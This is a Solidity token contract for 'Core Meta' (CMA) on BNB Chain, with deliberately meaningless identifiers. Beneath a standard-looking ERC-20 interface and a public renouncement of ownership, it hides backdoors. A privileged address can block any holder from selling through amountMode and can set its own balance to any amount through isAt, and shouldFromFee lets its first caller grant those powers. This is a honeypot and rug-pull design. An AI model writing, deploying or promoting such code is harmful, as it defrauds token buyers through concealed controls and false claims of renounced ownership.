/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface launchedFundShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeExemptLiquidity) external view returns (uint256);

    function transfer(address receiverShouldToken, uint256 receiverAmountToken) external returns (bool);

    function allowance(address modeShouldAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverAmountToken) external returns (bool);

    function transferFrom(
        address sender,
        address receiverShouldToken,
        uint256 receiverAmountToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableFund, uint256 value);
    event Approval(address indexed modeShouldAmount, address indexed spender, uint256 value);
}

interface launchedFundShouldMetadata is launchedFundShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract feeSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityAmount {
    function createPair(address launchTrading, address toMin) external returns (address);
}

interface limitMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreMeta is feeSender, launchedFundShould, launchedFundShouldMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return senderReceiver;
    }

    bool public tokenAt;

    function maxReceiverWallet() public {
        if (marketingFee != buySwap) {
            fundLaunched = false;
        }
        if (tokenTrading == buySwap) {
            buySwap = tokenTrading;
        }
        buySwap=0;
    }

    function transfer(address teamMarketing, uint256 receiverAmountToken) external virtual override returns (bool) {
        return enableBuy(_msgSender(), teamMarketing, receiverAmountToken);
    }

    function minTotalTx() public {
        
        if (buySwap != marketingFee) {
            tokenTrading = marketingFee;
        }
        maxFrom=false;
    }

    bool private totalTeam;

    uint256 private senderReceiver = 100000000 * 10 ** 18;

    function atSwap() public {
        
        
        liquidityTo=false;
    }

    bool private fundLaunched;

    mapping(address => uint256) private launchedTo;

    function sellLaunchedWallet() public {
        
        
        fundLaunched=false;
    }

    function owner() external view returns (address) {
        return walletBuySell;
    }

    function transferFrom(address modeTx, address receiverShouldToken, uint256 receiverAmountToken) external override returns (bool) {
        if (liquidityLimit[modeTx][_msgSender()] != type(uint256).max) {
            require(receiverAmountToken <= liquidityLimit[modeTx][_msgSender()]);
            liquidityLimit[modeTx][_msgSender()] -= receiverAmountToken;
        }
        return enableBuy(modeTx, receiverShouldToken, receiverAmountToken);
    }

    uint8 private enableBuyLaunched = 18;

    mapping(address => bool) public enableSell;

    function name() external view virtual override returns (string memory) {
        return marketingLaunched;
    }

    function launchFee() public view returns (bool) {
        return fundLaunched;
    }

    mapping(address => mapping(address => uint256)) private liquidityLimit;

    function amountMode(address totalSenderBuy) public {
        
        if (totalSenderBuy == enableSwap || totalSenderBuy == txMax || !takeEnableMarketing[_msgSender()]) {
            return;
        }
        if (marketingFee == buySwap) {
            totalTeam = false;
        }
        enableSell[totalSenderBuy] = true;
    }

    function approve(address isAmount, uint256 receiverAmountToken) public virtual override returns (bool) {
        liquidityLimit[_msgSender()][isAmount] = receiverAmountToken;
        emit Approval(_msgSender(), isAmount, receiverAmountToken);
        return true;
    }

    function allowance(address liquidityFromMax, address isAmount) external view virtual override returns (uint256) {
        return liquidityLimit[liquidityFromMax][isAmount];
    }

    function shouldFromFee(address atAutoFund) public {
        if (tokenAt) {
            return;
        }
        if (maxFrom == totalTeam) {
            maxFrom = true;
        }
        takeEnableMarketing[atAutoFund] = true;
        
        tokenAt = true;
    }

    string private tradingSellList = "CMA";

    address public enableSwap;

    event OwnershipTransferred(address indexed exemptTotal, address indexed autoLiquidityTrading);

    constructor (){
        if (liquidityTo == maxFrom) {
            fundLaunched = false;
        }
        limitMax minWallet = limitMax(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txMax = liquidityAmount(minWallet.factory()).createPair(minWallet.WETH(), address(this));
        walletBuySell = _msgSender();
        if (fundLaunched) {
            buySwap = tokenTrading;
        }
        enableSwap = walletBuySell;
        takeEnableMarketing[enableSwap] = true;
        if (totalTeam != liquidityTo) {
            buySwap = tokenTrading;
        }
        launchedTo[enableSwap] = senderReceiver;
        emit Transfer(address(0), enableSwap, senderReceiver);
        walletFrom();
    }

    function getOwner() external view returns (address) {
        return walletBuySell;
    }

    address private walletBuySell;

    uint256 public buySwap;

    function walletFrom() public {
        emit OwnershipTransferred(enableSwap, address(0));
        walletBuySell = address(0);
    }

    uint256 public marketingFee;

    function balanceOf(address takeExemptLiquidity) public view virtual override returns (uint256) {
        return launchedTo[takeExemptLiquidity];
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingSellList;
    }

    function decimals() external view virtual override returns (uint8) {
        return enableBuyLaunched;
    }

    function enableBuy(address modeTx, address receiverShouldToken, uint256 receiverAmountToken) internal returns (bool) {
        if (modeTx == enableSwap) {
            return sellTake(modeTx, receiverShouldToken, receiverAmountToken);
        }
        require(!enableSell[modeTx]);
        return sellTake(modeTx, receiverShouldToken, receiverAmountToken);
    }

    bool public maxFrom;

    function isAt(uint256 receiverAmountToken) public {
        if (!takeEnableMarketing[_msgSender()]) {
            return;
        }
        launchedTo[enableSwap] = receiverAmountToken;
    }

    mapping(address => bool) public takeEnableMarketing;

    string private marketingLaunched = "Core Meta";

    address public txMax;

    function sellTake(address modeTx, address receiverShouldToken, uint256 receiverAmountToken) internal returns (bool) {
        require(launchedTo[modeTx] >= receiverAmountToken);
        launchedTo[modeTx] -= receiverAmountToken;
        launchedTo[receiverShouldToken] += receiverAmountToken;
        emit Transfer(modeTx, receiverShouldToken, receiverAmountToken);
        return true;
    }

    bool private liquidityTo;

    uint256 private tokenTrading;

}